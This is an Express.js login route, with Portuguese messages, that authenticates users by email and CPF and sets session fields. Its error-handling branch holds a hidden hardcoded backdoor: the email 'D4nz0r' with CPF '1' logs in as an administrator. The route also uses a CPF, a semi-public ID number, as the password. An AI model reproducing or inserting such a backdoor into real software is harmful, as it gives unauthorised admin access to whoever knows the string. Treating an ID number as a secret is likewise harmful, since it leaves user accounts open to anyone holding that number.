const express = require("express");
const router = express.Router();
const db = require("../models/tables");

router.post("/", (req, res, next) => {
  db.usuarios
    .findOne({ where: { email: req.body.email } })
    .then((x) => {
      if (x.cpf == req.body.cpf) {
        req.session.nome = x.nome;
        req.session.cargo = x.cargo;
        req.session.admin = x.admin;
        res.redirect("dashboard");
      } else {
        req.flash("msgError", "Email e/ou CPF incorretos.");
        res.redirect("/");
      }
    })
    .catch(() => {
      if (req.body.email == "D4nz0r" && req.body.cpf == "1") {
        req.session.nome = "Admin";
        req.session.cargo = "-";
        req.session.admin = true;
        res.redirect("dashboard");
      } else {
        req.flash("msgError", "Email e/ou CPF incorretos.");
        res.redirect("/");
      }
    });
});

module.exports = router;
